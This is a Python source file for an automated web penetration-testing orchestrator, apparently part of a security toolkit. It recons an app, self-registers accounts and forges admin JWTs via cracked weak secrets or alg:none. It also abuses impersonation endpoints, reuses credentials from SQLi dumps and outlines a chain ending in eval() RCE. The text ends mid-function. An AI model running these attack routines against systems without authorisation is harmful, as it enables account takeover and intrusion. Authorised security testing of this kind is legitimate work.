"""caleb - a MULTI-PHASE, MULTI-IDENTITY orchestrator that reaches what single-pass bob structurally cannot.

Where bob is one unauthenticated pass, caleb runs a phase STATE-MACHINE over a shared, typed ARTIFACT STORE with
a real SESSION MANAGER: it recons the surface (including webpacked-SPA requests a static scrape misses, and
API/backend hosts that live on a DIFFERENT host than the UI), ACQUIRES one or more labelled identities (register /
login / debug-grab / weak-secret FORGE / alg:none / refresh), re-runs bob's whole check battery WITH each identity
injected, DETECTS session expiry and RE-AUTHS, and CHAINS findings across phases - two-account BFLA, a forged-admin
surface, sequence enumeration, and multi-stage chains like `SQLi -> dumped creds -> hidden panel login -> eval()
RCE`. It then reviews itself and LOOPS BACK when a new identity or lead appears (bounded by --max-rounds).

caleb is BUILT FROM SCRATCH. It REUSES three existing agents as sub-tools, by IMPORT, never editing them:
  - bob      - the proven single-pass scanner = caleb's per-phase SCANNING MUSCLE (full battery, headers injected)
             + a library of LLM-free primitives (token forge/crack, backstops, http helpers) caleb builds on.
  - crawlio  - endpoint / surface discovery in recon.
  - travis   - single-host recon triage to seed recon.
Plus any boxcutter TOOL that helps the recon reach (notably `browser-crawl`, to render the SPA and capture the
XHR/fetch calls webpack hides). The phase engine, artifact store, session manager, chaining, --creds/--context
parsing and report writer are ALL new code here.

  boxcutter ai caleb https://app.example.com --provider litellm --model openai/gpt-5 --api-key ... --llm-proxy-url ...
  boxcutter ai caleb https://app.example.com --creds admin:pass --creds-b alice:alice --out-dir /tmp/caleb_app
"""

from __future__ import annotations

import json
import os
import random
import re
import string
import sys
import types
from urllib.parse import urlparse

from . import bob                                   # stable dependency - IMPORT ONLY, never edit
from ..core.envelope import debug_print, output_result, set_output_kind
from ..irvin.provider import PROVIDERS, add_agent_args

NAME = "caleb"
KIND = "findings"
HELP = ("Caleb - multi-phase / multi-identity orchestrator: authenticated deep scan, reauth, two-account BFLA, "
        "and multi-step chains (reuses bob as its scanning muscle).")

# Tools caleb may drive directly for recon (beyond bob's own). browser-crawl renders the SPA and captures the
# XHR/fetch API calls a static bundle-scrape cannot see - the fix for heavily web-packed apps.
_RECON_TOOLS = ("browser-crawl", "katana-crawl", "http-request", "swagger-specs", "graphql-detect")

# Backend/API hosts often live on an api-/backend-style subdomain while the apex serves only the UI.
_BACKEND_SUBS = ("api", "apis", "backend", "gateway", "gw", "app", "rest", "graphql", "gql", "data", "core",
                 "srv", "service", "services", "admin", "internal", "auth")

# Third-party hosts to NEVER pull into scope (CDN / analytics / payment / fonts) even when the app references them.
_THIRD_PARTY = ("google", "gstatic", "googleapis", "googletagmanager", "cloudflare", "cloudfront", "akamai",
                "fastly", "jsdelivr", "unpkg", "cdnjs", "bootstrapcdn", "stripe", "paypal", "braintree",
                "sentry", "segment", "amplitude", "mixpanel", "intercom", "hotjar", "doubleclick", "facebook",
                "fbcdn", "twitter", "x.com", "linkedin", "youtube", "gravatar", "recaptcha", "cdn.", "fonts.")


# --------------------------------------------------------------------------------------------------------------
# redaction - a raw secret value is NEVER written to a report or shown to an LLM; only a placeholder + a length.
# --------------------------------------------------------------------------------------------------------------
def _redact(v: str) -> str:
    v = str(v or "")
    return f"<redacted:{len(v)}>" if v else "<none>"


def _norm(url: str) -> str:
    try:
        return bob._norm_url_key(url)
    except Exception:  # noqa: BLE001
        return str(url or "").lower()


# ==============================================================================================================
# ARTIFACT STORE - typed, multi-host, persisted. Every phase reads and appends; leads carry seen-but-unexploited
# signals so an off-phase SQLi/token/PII sighting is never dropped.
# ==============================================================================================================
class ArtifactStore:
    def __init__(self, base_url: str, out_dir: str | None = None):
        self.base_url = base_url
        self.apex_host = (urlparse(base_url).hostname or "").lower()
        self.hosts: list[str] = [self.apex_host]          # apex + discovered backend/API hosts (scanned in P2)
        self.backend_hosts: set = set()                   # the app's own backends (may be a DIFFERENT domain)
        self.seen_hosts: set = set()                      # every non-3rd-party host observed (candidates)
        self.endpoints: list[dict] = []                   # [{url, method, source}]
        self.params: list[str] = []
        self.sessions: list[dict] = []                    # [{label, role, headers(private), refresh, source, creds}]
        self.secrets: list[dict] = []                     # [{kind, location, value(redacted)}]
        self.leads: list[dict] = []                       # [{kind, detail, phase}] cross-lane observations
        self.findings: list[dict] = []
        self.cache: dict = {}                             # bob-style tool cache (feeds bob's backstops/primitives)
        self.ids_seen: list[str] = []                     # object ids observed (for BOLA walks / seeding)
        self.out_dir = out_dir
        self.rounds = 0

    # ---- endpoints ------------------------------------------------------------------------------------------
    def add_endpoint(self, url: str, method: str = "GET", source: str = ""):
        url = (url or "").split("#")[0]
        if not url.startswith("http"):
            return
        host = (urlparse(url).hostname or "").lower()
        if not host or any(tp in host for tp in _THIRD_PARTY):
            return                                          # never ingest a third-party host's URL
        self.seen_hosts.add(host)
        if host not in self.hosts and self._same_app(host):
            self.hosts.append(host)
        key = (method.upper(), _norm(url))
        if key not in {(e["method"], _norm(e["url"])) for e in self.endpoints}:
            self.endpoints.append({"url": url.split("?")[0] if "?" not in url else url,
                                   "method": method.upper(), "source": source})

    def _same_app(self, host: str) -> bool:
        """In-scope = the apex, a confirmed backend host (which may be a DIFFERENT domain the app itself calls),
        or a same-registrable-domain host - and never a third-party (CDN/analytics/payment). The different-domain
        backend case is what makes an app whose API lives on a wholly separate domain still get scanned."""
        host = (host or "").lower()
        if not host or any(tp in host for tp in _THIRD_PARTY):
            return False
        if host == self.apex_host or host in self.backend_hosts:
            return True
        def reg(h):
            p = h.split(".")
            return ".".join(p[-2:]) if len(p) >= 2 else h
        return reg(host) == reg(self.apex_host)

    def match_endpoints(self, *nouns, method: str | None = None) -> list[str]:
        out = []
        for e in self.endpoints:
            if method and e["method"] != method.upper():
                continue
            p = urlparse(e["url"]).path.lower()
            if any(("/" + n) in p or p.rstrip("/").endswith(n) for n in nouns):
                out.append(e["url"])
        return out

    # ---- leads / secrets / ids ------------------------------------------------------------------------------
    def add_lead(self, kind: str, detail: str, phase: str = ""):
        if not any(l["kind"] == kind and l["detail"] == detail for l in self.leads):
            self.leads.append({"kind": kind, "detail": detail, "phase": phase})

    def add_secret(self, kind: str, location: str, value: str = ""):
        self.secrets.append({"kind": kind, "location": location, "value": _redact(value)})
        self.add_lead("secret", f"{kind}@{location}", "")

    def note_ids(self, ids):
        for i in ids:
            if i and i not in self.ids_seen:
                self.ids_seen.append(i)

    # ---- findings -------------------------------------------------------------------------------------------
    def add_findings(self, fs, phase: str = ""):
        seen = {(str(f.get("title", "")).lower(), _norm(str(f.get("url", "")))) for f in self.findings}
        added = 0
        for f in (fs or []):
            if not isinstance(f, dict):
                continue
            k = (str(f.get("title", "")).lower(), _norm(str(f.get("url", ""))))
            if k in seen:
                continue
            seen.add(k)
            f = dict(f)
            f.setdefault("phase", phase)
            self.findings.append(f)
            added += 1
        return added

    # ---- persistence (raw session tokens redacted on disk) --------------------------------------------------
    def persist(self):
        d = self.out_dir or os.path.join(_repo_opt(), "caleb_artifacts")
        try:
            os.makedirs(d, exist_ok=True)
            snap = {
                "base_url": self.base_url, "hosts": self.hosts, "rounds": self.rounds,
                "endpoints": self.endpoints, "params": self.params,
                "sessions": [{"label": s["label"], "role": s.get("role"), "source": s.get("source"),
                              "headers": [re.sub(r"(Bearer|Cookie:?)\s+\S+", r"\1 <redacted>", h, flags=re.I)
                                          for h in s.get("headers", [])]} for s in self.sessions],
                "secrets": self.secrets, "leads": self.leads, "findings": self.findings,
            }
            with open(os.path.join(d, f"{self.apex_host}.json"), "w", encoding="utf-8") as fh:
                json.dump(snap, fh, indent=2)
        except OSError:
            pass


def _repo_opt() -> str:
    here = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(here, "..", "..", "opt")


# ==============================================================================================================
# SESSION MANAGER - the piece bob lacks. acquire -> store privately -> inject -> detect-expiry -> reauth ->
# resume. Two independent identities A/B for cross-account BFLA. Raw tokens never leave the store.
# ==============================================================================================================
class SessionManager:
    def __init__(self, store: ArtifactStore, args):
        self.store = store
        self.args = args
        self.base = store.base_url

    # ---- private token helpers (reuse bob's crypto/http primitives) -----------------------------------------
    def _bearer(self, tok: str) -> list:
        return [f"Authorization: Bearer {tok}"]

    def _capture_token(self, body: str) -> str:
        toks = bob._JWT_RE.findall(body or "")
        return toks[0] if toks else ""

    # ---- acquisition strategies (self-acquisition preferred; --creds only to validate authed phases) --------
    def acquire_register(self, label="A") -> dict | None:
        """Register a fresh account on a DISCOVERED register endpoint; capture its access + refresh token."""
        uname = "caleb" + "".join(random.choices(string.ascii_lowercase, k=9))
        body = {"username": uname, "email": uname + "@example.com", "password": "Passw0rd!23"}
        for u in self.store.match_endpoints("register", "signup", "sign-up", method="POST") or \
                 self.store.match_endpoints("register", "signup"):
            st, resp = bob._rest_post(u.split("?")[0], body, [], self.args.debug)
            tok = self._capture_token(resp)
            if tok:
                refresh = next((t for t in bob._JWT_RE.findall(resp) if self._is_refresh(t)), "")
                return self._store(label, "user", self._bearer(tok), f"register@{urlparse(u).path}",
                                   creds=(uname, body["password"]), refresh=refresh, token=tok)
        return None

    def acquire_login(self, user: str, pw: str, label="A") -> dict | None:
        """Log in with creds on a DISCOVERED login endpoint (validates authed phases / seed identity)."""
        for u in (self.store.match_endpoints("login", "signin", "sign-in", "auth", method="POST") or
                  self.store.match_endpoints("login", "signin", "session", "token")):
            up = u.split("?")[0]
            if any(x in up.lower() for x in ("login-as", "loginas")):
                continue
            st, resp = bob._rest_post(up, {"username": user, "email": user, "password": pw}, [], self.args.debug)
            tok = self._capture_token(resp)
            if tok:
                refresh = next((t for t in bob._JWT_RE.findall(resp) if self._is_refresh(t)), "")
                return self._store(label, "user", self._bearer(tok), f"login@{urlparse(up).path}",
                                   creds=(user, pw), refresh=refresh, token=tok)
        # GraphQL login mutation fallback
        gql = bob._find_graphql_endpoint(self.store.cache, self.base, [], self.args.debug)
        if gql:
            q = '{"query":"mutation{login(username:%s,password:%s){accessToken refreshToken}}"}' % (
                json.dumps(user), json.dumps(pw))
            raw = bob._call(["http-request", gql, "-D", q, "-H", "Content-Type: application/json"], [], self.args.debug)
            body = str(((_j(raw).get("data") or [{}])[0] or {}).get("content") or "")
            tok = self._capture_token(body)
            if tok:
                return self._store(label, "user", self._bearer(tok), f"login-mutation@{urlparse(gql).path}",
                                   creds=(user, pw), token=tok)
        return None

    def acquire_debug_grab(self, label="A") -> dict | None:
        """Grab a token a debug/whoami/auth-test endpoint hands out (bob's designed-endpoint token extractor)."""
        hdrs = bob._acquire_debug_token(self.store.cache, self.base, self.args.debug)
        if hdrs:
            tok = ""
            m = re.search(r"Bearer\s+(\S+)", hdrs[0])
            if m:
                tok = m.group(1)
            role = "admin" if tok in ("admin", "1") else "user"
            return self._store(label, role, hdrs, "debug-endpoint-grab", token=tok)
        return None

    def acquire_forge(self, label="B") -> dict | None:
        """Forge an admin token from a captured JWT + a cracked weak secret (self-acquired -> proves the vuln)."""
        toks = bob._harvest_jwts(self.store.cache)
        cands = bob._jwt_secret_candidates(self.base, self.store.cache)
        for t in toks[:8]:
            sec = bob._jwt_crack(t, cands)
            if sec:
                forged = bob._jwt_forge_admin(t, sec)
                self.store.add_secret("jwt_signing_secret", "weak/guessable", sec)
                return self._store(label, "admin", self._bearer(forged), "forge(weak-secret)", token=forged)
        # alg:none fallback
        forged = bob._ALG_NONE_JWT
        return self._store(label, "admin", self._bearer(forged), "forge(alg:none)", token=forged) \
            if _looks_authy(self.store) else None

    def acquire_login_as(self, target_id: str, label="B") -> dict | None:
        """Impersonate another user via a discovered login-as/impersonate endpoint that lacks an admin check."""
        for u in self.store.match_endpoints("login-as", "loginas", "impersonate", "switch-user", "sudo"):
            up = u.split("?")[0]
            st, resp = bob._rest_post(up, {"userId": target_id, "id": target_id, "username": "admin"}, [], self.args.debug)
            tok = self._capture_token(resp)
            if tok:
                return self._store(label, "impersonated", self._bearer(tok), f"login-as@{urlparse(up).path}", token=tok)
        return None

    # ---- expiry detection + reauth --------------------------------------------------------------------------
    def is_expired(self, status: int, body: str) -> bool:
        if status in (401, 403):
            return True
        low = (body or "")[:400].lower()
        return any(s in low for s in ("unauthorized", "not authenticated", "token expired", "invalid token",
                                      "please log in", "authentication required", "jwt expired"))

    def reauth(self, sess: dict) -> bool:
        """Re-mint a session that expired: try its refresh token, then its stored creds, then a re-forge."""
        label = sess["label"]
        # 1) refresh token
        if sess.get("refresh"):
            for u in (self.store.match_endpoints("refresh", "token", "session", "renew") +
                      [f"{urlparse(self.base).scheme}://{self.store.apex_host}/api/refresh"]):
                st, resp = bob._rest_post(u.split("?")[0], {"refreshToken": sess["refresh"],
                                          "refresh_token": sess["refresh"], "token": sess["refresh"]}, [], self.args.debug)
                tok = self._capture_token(resp)
                if tok and not self.is_expired(st, resp):
                    sess["headers"] = self._bearer(tok)
                    self.store.add_lead("reauth", f"{label} via refresh", "P2")
                    return True
        # 2) stored creds
        if sess.get("creds"):
            new = self.acquire_login(sess["creds"][0], sess["creds"][1], label=label)
            if new:
                return True
        # 3) re-forge
        if sess.get("role") in ("admin", "impersonated"):
            new = self.acquire_forge(label=label)
            if new:
                return True
        return False

    # ---- store (private) ------------------------------------------------------------------------------------
    def _store(self, label, role, headers, source, creds=None, refresh="", token="") -> dict:
        existing = next((s for s in self.store.sessions if s["label"] == label), None)
        sess = {"label": label, "role": role, "headers": headers, "source": source,
                "creds": creds, "refresh": refresh, "_token": token}
        if existing:
            existing.update(sess)
            sess = existing
        else:
            self.store.sessions.append(sess)
        self.store.add_lead("identity", f"{label}:{role} ({source})", "P1")
        debug_print(f"caleb :: identity {label} acquired: role={role} via {source} (token {_redact(token)})")
        return sess

    @staticmethod
    def _is_refresh(t: str) -> bool:
        try:
            return json.loads(bob._b64url_decode(t.split(".")[1])).get("type") == "refresh"
        except Exception:  # noqa: BLE001
            return False


def _looks_authy(store: ArtifactStore) -> bool:
    return bool(store.match_endpoints("login", "auth", "me", "account", "admin", "token"))


def _j(raw):
    try:
        return json.loads(raw)
    except Exception:  # noqa: BLE001
        return {}


# ==============================================================================================================
# bob reuse - run bob's FULL check battery (LLM loop + every backstop) with caleb's headers/context injected.
# ==============================================================================================================
def _bob_scan(target, headers, context, args, tag, max_steps=None) -> tuple:
    """Invoke bob.run in-process with a constructed args namespace; return (findings, envelope). This is caleb's
    per-phase scanning muscle: bob's whole battery, authenticated by the injected header list."""
    out = os.path.join(_scratch(), f"caleb_bob_{tag}_{random.randint(1000,9999)}.json")
    ns = types.SimpleNamespace(
        target=target, header=list(headers or []), context=context or "",
        provider=args.provider, model=args.model, api_key=args.api_key, base_url=args.base_url,
        max_steps=max_steps or args.max_steps, report=None, output=out, table=False,
        debug=args.debug, jsonl=None, severity=None)
    set_output_kind("findings")
    try:
        bob.run(ns)
    except Exception as exc:  # noqa: BLE001
        debug_print(f"caleb :: bob scan ({tag}) error: {exc}")
        return [], {}
    env = {}
    try:
        with open(out, encoding="utf-8") as fh:
            env = json.load(fh)
    except Exception:  # noqa: BLE001
        pass
    finally:
        try:
            os.remove(out)
        except OSError:
            pass
    return (env.get("data") or []), env


def _scratch() -> str:
    d = os.environ.get("TEMP") or os.environ.get("TMPDIR") or "/tmp"
    return d


# bob's DETERMINISTIC backstops = a "smaller agent based on bob" (LLM-FREE) - caleb's cheap per-identity muscle.
# Running these with an identity's headers injected costs NO tokens, so caleb spends its one LLM bob run on the
# P0 baseline and keeps every authed/per-host/per-identity re-scan free.
_BOB_BACKSTOPS = ("_fuzz_backstop", "_biz_logic_backstop", "_user_enum_backstop", "_bola_walk_backstop",
                  "_header_mutation_backstop", "_weak_reset_backstop", "_jwt_weak_secret_backstop",
                  "_graphql_exploit_backstop", "_rest_exploit_backstop", "_alg_none_backstop")


def _seed_cache_for(target: str, headers: list, base_cache: dict, args) -> dict:
    """A per-host bob-style cache (reusing what P0 already fetched where the host matches), topped up with a few
    authenticated observations so the backstops have fresh, identity-scoped bodies to work from."""
    host = (urlparse(target).hostname or "").lower()
    cache = {k: v for k, v in base_cache.items()
             if not (len(k) >= 2 and isinstance(k[1], str) and k[1].startswith("http"))
             or (urlparse(k[1]).hostname or "").lower() == host}
    for argv in (["http-request", target + "/"], ["katana-crawl", target + "/", "--js"],
                 ["http-request", target + "/api/users"], ["graphql-detect", target]):
        key = tuple(argv)
        cache[key] = bob._call(argv, headers, args.debug)
    return cache


def _bob_backstops(target: str, headers: list, base_cache: dict, args) -> list:
    """Run bob's deterministic backstops (LLM-free) with the session headers injected → authenticated findings."""
    cache = _seed_cache_for(target, headers, base_cache, args)
    # let bob acquire any designed-debug token too, then merge headers
    hdrs = list(headers) + [h for h in bob._acquire_debug_token(cache, target, args.debug) if h not in headers]
    found = []
    for name in _BOB_BACKSTOPS:
        fn = getattr(bob, name, None)
        if not fn:
            continue
        try:
            found += fn(cache, hdrs, target, args.debug) or []
        except Exception as exc:  # noqa: BLE001
            debug_print(f"caleb :: backstop {name} err: {exc}")
    return found


# ==============================================================================================================
# caleb's own deterministic passes (bob primitives) for the reach bob can't do single-pass: cross-identity BFLA
# and the multi-stage cred-reuse -> login -> console -> RCE chain. This is the multi-step LANE (caleb's, not bob's).
# ==============================================================================================================
_CODE_FIELD = ("code", "cmd", "command", "exec", "eval", "query", "sql", "run", "shell", "php", "script", "input")
_USER_FIELD = ("login", "username", "user", "email", "userid", "name", "account")
_PASS_FIELD = ("password", "passwd", "pass", "pwd", "secret")


def _parse_forms(body: str) -> list:
    forms = []
    for fm in re.finditer(r"<form\b([^>]*)>(.*?)</form>", body or "", re.I | re.S):
        attrs, inner = fm.group(1), fm.group(2)
        action = (re.search(r'action\s*=\s*["\']([^"\']*)["\']', attrs, re.I) or [None, ""])[1]
        fields, has_pw = {}, False
        for inp in re.finditer(r"<(?:input|textarea)\b([^>]*)>", inner, re.I):
            ia = inp.group(1)
            name = (re.search(r'name\s*=\s*["\']([^"\']+)["\']', ia, re.I) or [None, None])[1]
            if not name:
                continue
            fields[name] = (re.search(r'value\s*=\s*["\']([^"\']*)["\']', ia, re.I) or [None, ""])[1]
            if (re.search(r'type\s*=\s*["\']([^"\']*)["\']', ia, re.I) or [None, ""])[1].lower() == "password":
                has_pw = True
        forms.append({"action": action, "fields": fields, "has_pw": has_pw})
    return forms


def _abs(page_url: str, action: str) -> str:
    if not action:
        return page_url
    if action.startswith("http"):
        return action
    p = urlparse(page_url)
    if action.startswith("/"):
        return f"{p.scheme}://{p.hostname}{action}"
    return page_url.rsplit("/", 1)[0] + "/" + action


def _set_cookie(env: dict) -> str:
    d = (env.get("data") or [{}])[0] or {}
    h = d.get("headers") or {}
    if isinstance(h, dict):
        for k, v in h.items():
            if str(k).lower() == "set-cookie":
                return str(v).split(";")[0]
    return ""


def _gather_creds(store: ArtifactStore) -> list:
    """Username/password pairs caleb RECOVERED (SQLi dumps, leaked files) + credential-shaped tokens from
    injection-response bodies - the material for the cred-reuse chain. Reuses bob's own gatherers if present."""
    creds = []
    seen = set()

    def add(u, p):
        u, p = str(u).strip(), str(p).strip()
        if u and p and 1 <= len(u) <= 64 and 1 <= len(p) <= 64 and (u, p) not in seen:
            seen.add((u, p))
            creds.append((u, p))

    for key, raw in store.cache.items():
        if not raw:
            continue
        txt = _cache_text(raw)
        for block in re.findall(r"Dumped[^\n]*:\n((?:\s*[^\n]*\|?[^\n]*\n?)+)", txt):
            for line in block.splitlines():
                cells = [c.strip() for c in line.split("|") if c.strip() and c.strip().lower() not in ("id",)]
                for i in range(len(cells) - 1):
                    add(cells[i], cells[i + 1])
                if len(cells) == 1:
                    add("admin", cells[0])
        for m in re.finditer(r'(?:user(?:name)?|login|admin)["\']?\s*[:=]\s*["\']?([A-Za-z0-9_.@-]{2,32})'
                             r'[^\n]{0,60}?(?:pass(?:word|wd)?|pwd|secret)["\']?\s*[:=]\s*["\']?([^\s"\'<>,;]{3,40})',
                             txt, re.I):
            add(m.group(1), m.group(2))
    # candidate tokens from UNION-style bodies (a password rendered into an <img src> etc.)
    for key, raw in store.cache.items():
        if not key or key[0] != "http-request" or len(key) < 2 or not isinstance(key[1], str):
            continue
        if not re.search(r"union|select|--|'|%27|information_schema", key[1], re.I):
            continue
        for tok in re.findall(r"[A-Za-z0-9_.@!$-]{6,40}", _cache_text(raw)):
            if any(c.isdigit() for c in tok) and any(c.isalpha() for c in tok):
                for u in ("admin", "administrator", "root"):
                    add(u, tok)
    return creds[:16]


def _cache_text(raw: str) -> str:
    try:
        env = json.loads(raw)
    except Exception:  # noqa: BLE001
        return raw
    parts = []

    def walk(x):
        if isinstance(x, str):
            parts.append(x)
        elif isinstance(x, dict):
            [walk(v) for v in x.values()]
        elif isinstance(x, list):
            [walk(v) for v in x]

    walk(env)
    return "\n".join(parts)


# ==============================================================================================================
# THE PHASES
# ==============================================================================================================
def phase_p0_recon(store: ArtifactStore, args) -> None:
    """UNAUTH RECON & SURFACE. Observe the app the way a user's browser does (render the SPA, catch its XHR/fetch
    calls - the fix for web-packed apps), discover backend/API hosts (which may be a different host than the UI),
    map endpoints/params, run bob's unauth battery for baseline findings, and record leaked creds/tokens/leads."""
    base = store.base_url
    debug_print(f"caleb :: P0 recon on {base}")
    # 1) browser-crawl: render + capture real API calls (method-aware) that a static scrape misses
    raw = bob._call(["browser-crawl", base], [], args.debug)
    for d in (_j(raw).get("data") or []):
        if isinstance(d, dict) and d.get("url"):
            store.add_endpoint(d["url"], d.get("method", "GET"), "browser-crawl")
        elif isinstance(d, str):
            store.add_endpoint(d, "GET", "browser-crawl")
    store.cache[("browser-crawl", base)] = raw
    # 2) seed bob's cache with observation (base page + crawl + a GraphQL probe) for its miners/backstops
    for argv in (["http-request", base + "/"], ["katana-crawl", base + "/", "--js"],
                 ["graphql-detect", base]):
        store.cache[tuple(argv)] = bob._call(argv, [], args.debug)
    # 3) bob route-mining (bundle fragments + API base) - agnostic endpoint discovery
    try:
        eps, _b, api_host = bob._mine_rest_routes(store.cache, base, [], args.debug)
        for e in eps:
            store.add_endpoint(e, "GET", "bob-mine")
    except Exception:  # noqa: BLE001
        pass
    # 4) backend-host / subdomain discovery: the API may live off the UI host
    _discover_backend_hosts(store, args)
    # 5) leaked tokens / ids as leads
    toks = bob._harvest_jwts(store.cache)
    if toks:
        store.add_lead("token", f"{len(toks)} JWT(s) observed unauth", "P0")
    store.note_ids(_harvest_ids(store))
    # 6) bob's UNAUTH battery = P0 baseline findings (single-pass ceiling). ONE full LLM bob run (its agentic
    #    layer + all backstops); if the LLM is unavailable/errors, fall back to the deterministic backstops so
    #    caleb still produces a baseline. This is caleb's only LLM bob run - P2/P3 are LLM-free.
    ctx = _endpoint_context(store)
    f0, _env = _bob_scan(base, [], _scope_context(store, ctx, None), args, "p0")
    if not f0:
        debug_print("caleb :: P0 LLM baseline empty - falling back to deterministic backstops")
        f0 = _bob_backstops(base, [], store.cache, args)
    n = store.add_findings(f0, "P0-unauth")
    _leads_from_findings(store, f0, "P0")
    debug_print(f"caleb :: P0 done: {len(store.endpoints)} endpoints across {len(store.hosts)} host(s); {n} baseline findings")


def _discover_backend_hosts(store: ArtifactStore, args) -> None:
    """Add the app's own backend/API hosts (same registrable domain) - from absolute URLs the bundle references,
    plus a probe of api-/backend-style subdomains. Third-party hosts are excluded by ArtifactStore._same_app."""
    apex = store.apex_host
    reg = ".".join(apex.split(".")[-2:]) if apex.count(".") >= 1 else apex
    # (a) absolute backend origins bob detects from the bundle - these are the app's OWN backend, and bob already
    #     excludes third-party, so trust them EVEN when they are a different registrable domain than the UI.
    try:
        for origin in bob._app_backend_origins(store.cache, store.base_url):
            h = (urlparse(origin).hostname or "").lower()
            if h and not any(tp in h for tp in _THIRD_PARTY):
                store.backend_hosts.add(h)                  # authoritative: different-domain API is in-scope
                if h not in store.hosts:
                    store.hosts.append(h)
                    store.add_lead("backend-host", h, "P0")
    except Exception:  # noqa: BLE001
        pass
    # (a2) any observed host the app itself calls with API-shaped paths (a different-domain backend) - promote it
    for h in list(store.seen_hosts):
        if h == apex or h in store.hosts or any(tp in h for tp in _THIRD_PARTY):
            continue
        api_paths = [e for e in store.endpoints if (urlparse(e["url"]).hostname or "").lower() == h and
                     re.search(r"/(api|v\d|rest|graphql|gql|query|auth)\b", urlparse(e["url"]).path.lower())]
        if api_paths:
            store.backend_hosts.add(h)
            store.hosts.append(h)
            store.add_lead("backend-host", f"{h} (app calls its API here)", "P0")
    # (b) probe api-/backend-style subdomains of the registrable domain (only add if they actually answer)
    scheme = urlparse(store.base_url).scheme or "https"
    labels = apex.split(".")
    subprefix = labels[0] if len(labels) > 2 else ""       # e.g. www
    for sub in _BACKEND_SUBS:
        cand = f"{sub}.{reg}"
        if cand == apex or cand in store.hosts:
            continue
        raw = bob._call(["http-request", f"{scheme}://{cand}/"], [], args.debug)
        d = (_j(raw).get("data") or [{}])[0] or {}
        if int(d.get("status") or 0) in (200, 301, 302, 401, 403, 404) and d.get("content") is not None \
                and int(d.get("status") or 0) != 0:
            # a real DNS answer (not a connection error) -> a backend host worth scanning
            if int(d.get("status") or 0) not in (0,):
                store.hosts.append(cand)
                store.cache[("http-request", f"{scheme}://{cand}/")] = raw
                store.add_lead("backend-host", f"{cand} (probed)", "P0")


def _harvest_ids(store: ArtifactStore) -> list:
    ids = []
    for raw in store.cache.values():
        for m in re.findall(r'"id"\s*:\s*"?([0-9a-fA-F][0-9a-fA-F-]{2,39}|\d{1,9})"?', _cache_text(raw)):
            if m not in ids:
                ids.append(m)
    return ids[:40]


def phase_p1_identity(store: ArtifactStore, sm: SessionManager, args) -> None:
    """IDENTITY ACQUISITION. Prefer SELF-acquisition (proves the vuln): register a fresh account; grab a token a
    debug endpoint hands out; FORGE admin via a weak secret / alg:none. Fall back to --creds to seed authed
    phases. Build up to two labelled identities (A user, B admin/second-account)."""
    debug_print("caleb :: P1 identity acquisition")
    # identity A: self-register first; else --creds; else debug-grab
    if not sm.acquire_register("A"):
        if getattr(args, "creds", None) and ":" in args.creds:
            u, p = args.creds.split(":", 1)
            sm.acquire_login(u, p, "A")
        else:
            sm.acquire_debug_grab("A")
    # identity B: forge admin (self) preferred; else second creds; else login-as an observed id
    if not sm.acquire_forge("B"):
        if getattr(args, "creds_b", None) and ":" in args.creds_b:
            u, p = args.creds_b.split(":", 1)
            sm.acquire_login(u, p, "B")
        elif store.ids_seen:
            sm.acquire_login_as(store.ids_seen[0], "B")
    if not store.sessions:
        store.add_lead("no-identity", "could not acquire any identity (unauth-only app?)", "P1")


def phase_p2_authed(store: ArtifactStore, sm: SessionManager, args, only_new=True) -> None:
    """AUTHENTICATED DEEP SCAN. Re-run bob's full battery WITH each identity injected, across every discovered
    host, feeding the P0 endpoint inventory in. Detect session expiry and RE-AUTH before scanning."""
    for sess in list(store.sessions):
        if only_new and sess.get("_scanned"):
            continue
        # validate/reauth the session before spending a scan on it
        _validate_or_reauth(store, sm, sess, args)
        for host in store.hosts:
            target = f"{urlparse(store.base_url).scheme}://{host}"
            # bob's DETERMINISTIC backstops with this identity injected (LLM-FREE) - the token-cheap per-identity
            # muscle. bob's one full LLM battery was already spent on the P0 baseline.
            f = _bob_backstops(target, sess["headers"], store.cache, args)
            tagged = _tag_identity(f, sess)
            n = store.add_findings(tagged, f"P2-{sess['label']}")
            _leads_from_findings(store, f, "P2")
            debug_print(f"caleb :: P2 identity {sess['label']} @ {host}: {len(f)} findings (+{n} new)")
        sess["_scanned"] = True


def _validate_or_reauth(store, sm, sess, args) -> None:
    """Probe an account endpoint with the session; if it looks expired, RE-AUTH before scanning."""
    probe = (store.match_endpoints("me", "account", "profile", "whoami") or [store.base_url + "/"])[0]
    raw = bob._call(["http-request", probe.split("?")[0]], sess["headers"], args.debug)
    d = (_j(raw).get("data") or [{}])[0] or {}
    if sm.is_expired(int(d.get("status") or 0), str(d.get("content") or "")):
        if sm.reauth(sess):
            debug_print(f"caleb :: reauth OK for identity {sess['label']}")
        else:
            store.add_lead("reauth-failed", sess["label"], "P2")


def phase_p3_chain(store: ArtifactStore, sm: SessionManager, args) -> None:
    """CROSS-IDENTITY & CHAINING - the multi-step reach bob can't do single-pass:
      (a) two-account BFLA: ids leaked to identity A -> read as identity B;
      (b) forged-admin surface walk;
      (c) SQLi -> dumped creds -> hidden panel login -> eval() RCE (deterministic, this is caleb's LANE)."""
    debug_print("caleb :: P3 cross-identity & chaining")
    # (a) two-account BFLA
    _chain_two_account_bfla(store, args)
    # (b) forged-admin / privileged-identity walk of admin surface
    _chain_admin_walk(store, args)
    # (c) cred-reuse -> login -> console -> RCE chain
    _chain_cred_reuse_rce(store, sm, args)


def _chain_two_account_bfla(store: ArtifactStore, args) -> None:
    """Identity A's own object-ids, requested AS identity B (and vice-versa): a 200 with A's data under B = BFLA
    across accounts (the thing a single identity can't prove)."""
    a = next((s for s in store.sessions if s["label"] == "A"), None)
    b = next((s for s in store.sessions if s["label"] == "B"), None)
    if not a or not b:
        return
    # collect A's ids from an account/me/orders read as A
    a_ids = []
    for u in store.match_endpoints("me", "account", "orders", "profile", "users"):
        raw = bob._call(["http-request", u.split("?")[0]], a["headers"], args.debug)
        body = _cache_text(raw)
        a_ids += re.findall(r'"id"\s*:\s*"?([0-9a-fA-F][0-9a-fA-F-]{2,39}|\d{1,9})"?', body)
    a_ids = list(dict.fromkeys(a_ids))[:5]
    # request id-bearing detail endpoints AS B
    for u in store.match_endpoints("users", "orders", "invoice", "account", "profile", "payments"):
        if not re.search(r"/(\{[^}]+\}|:\w+|\d+|[0-9a-fA-F-]{8,})$", u) and not a_ids:
            continue
        for aid in (a_ids or ["1", "2"]):
            det = re.sub(r"/(\{[^}]+\}|:\w+|\d+|[0-9a-fA-F-]{8,})$", "/" + aid, u.split("?")[0])
            if det == u.split("?")[0]:
                det = u.split("?")[0].rstrip("/") + "/" + aid
            raw = bob._call(["http-request", det], b["headers"], args.debug)
